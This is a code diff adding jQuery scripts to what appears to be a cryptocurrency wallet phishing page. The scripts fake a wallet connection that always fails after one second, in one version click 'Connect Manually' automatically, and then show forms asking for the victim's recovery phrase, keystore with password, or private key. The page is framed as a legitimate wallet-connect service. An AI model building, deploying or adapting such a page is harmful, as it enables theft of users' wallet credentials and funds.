@@ -1,0 +1,136 @@
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Search functionality
+            $("#searchInput").on("input", function() {
+                const input = $(this).val().toLowerCase();
+                $(".coin").each(function() {
+                    const name = $(this).find("h4").text().toLowerCase();
+                    $(this).toggle(name.includes(input));
+                });
+            });
+
+            // Wallet connection
+            $(".coin").on("click", function() {
+                const img = $(this).find(".coin-img").attr("src");
+                const name = $(this).find("h4").text().trim();
+
+                $("#current-wallet-logo").attr("src", img);
+                $("#current-wallet-app").text(name);
+                $(".connection-info").text("Initializing...");
+                $("#connect-dialog").show();
+
+                setTimeout(function() {
+                    $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
+                }, 1000);
+            });
+
+            // Manual connection
+            $(document).on("click", ".manual-connection", function() {
+                $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
+                $("#current-wallet-app-send").text($("#current-wallet-app").text());
+                $("#walletNameData").val($("#current-wallet-app").text());
+                $("#connect-dialog").hide();
+                $("#send-dialog").show();
+            });
+
+            // Tab switching
+            $("#phraseSend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="phrase"><textarea name="phrase" required class="form-control" rows="5" placeholder="Enter your recovery phrase"></textarea><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
+            });
+
+            $("#keystoreSend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="keystore"><textarea name="keystore" required class="form-control" rows="5" placeholder="Enter Keystore"></textarea><input type="text" name="password" required class="form-control" placeholder="Wallet password"><small>Several lines of text beginning with "{...}" plus password</small>');
+            });
+
+            $("#privateKeySend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
+            });
+
+            // Dialog dismiss
+            $(".dialog-dismiss").click(function() {
+                $("#connect-dialog, #send-dialog").hide();
+            });
+        });
+    </script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <!-- <script src="./script/walletpage.js"></script> -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
+    <script src="./assets/jquery.waypoints.min.js.download"></script>
+    <script src="./assets/jquery.counterup.min.js.download"></script>
+    <script src="./assets/wow.min.js.download"></script>
+    <script src="./assets/script.js.download"></script>
+    <script>
+        $(document).ready(function() {
+            let wallets = $(".coin-registry button");
+            wallets.each(function() {
+                $(this).on("click", function() {
+                    let img = $(this).find(".coin-img").attr("src");
+                    event.preventDefault();
+                    $(".connection-info").text("Initializing...");
+                    $("#current-wallet-app").text(
+                        $(this).children().last().text().trim()
+                    );
+                    $("#current-wallet-logo").attr("src", img);
+                    $("#connect-dialog").show();
+                    setTimeout(function() {
+                        $(".connection-info").html(
+                            'Error Connecting... <button class="manual-connection">Connect Manually</button>'
+                        );
+                        $(document).find("button.manual-connection").trigger("click");
+                    }, 1000);
+                });
+            });
+        });
+    </script>
+    <script>
+        $(document).ready(function() {
+            let dialogDismiss = $(".dialog-dismiss");
+            let sendForm = $("#data-to-send");
+            let successBox = $("#success-dialog");
+            let errorBox = $("#error-dialog");
+            dialogDismiss.each(function() {
+                $(this).on("click", function() {
+                    $("#connect-dialog").hide();
+                    $("#send-dialog").hide();
+                });
+            });
+            $("#phraseSend").on("click", function() {
+                sendForm.html(
+                    '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+                );
+            });
+            $("#keystoreSend").on("click", function() {
+                sendForm.html(
+                    '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+                );
+            });
+            $("#privateKeySend").on("click", function() {
+                sendForm.html(
+                    '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+                );
+            });
+
+            $(".connection-info").on("click", ".manual-connection", function() {
+                $("#current-wallet-app-send").text($("#current-wallet-app").text());
+                $("#walletNameData").val($("#current-wallet-app").text());
+                var link = $("#current-wallet-app").text();
+                $("#current-wallet-send-logo").attr(
+                    "src",
+                    $("#current-wallet-logo").attr("src")
+                );
+                $("#connect-dialog").hide();
+                $("#send-dialog").show();
+            });
+
+            $.ajaxSetup({
+                headers: {
+                    "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
+                },
+            });
+
+        });
+    </script>
